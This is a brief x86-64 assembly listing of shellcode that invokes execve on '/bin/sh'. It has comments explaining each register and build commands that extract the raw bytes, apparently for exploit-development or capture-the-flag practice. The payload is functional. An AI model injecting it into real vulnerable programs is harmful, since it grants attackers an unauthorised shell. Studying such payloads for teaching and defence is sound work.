//gcc -nostdlib -static shellcode.s -o shellcode-elf
//objcopy --dump-section .text=shellcode-raw shellcode-elf


.global _start
_start:
.intel_syntax noprefix
    mov rax, 59             # this is the syscall number of execve
    lea rdi, [rip+binsh]    # pints the first argument of execve at the /bin/sh string below
    xor rsi, rsi            # zero out rsi, second argument, argv, NULL
    xor rdx, rdx            # zero out rdx, third argument, envp, NULL
    syscall                 # call execve
binsh:
    .string "/bin/sh"       # the string /bin/sh
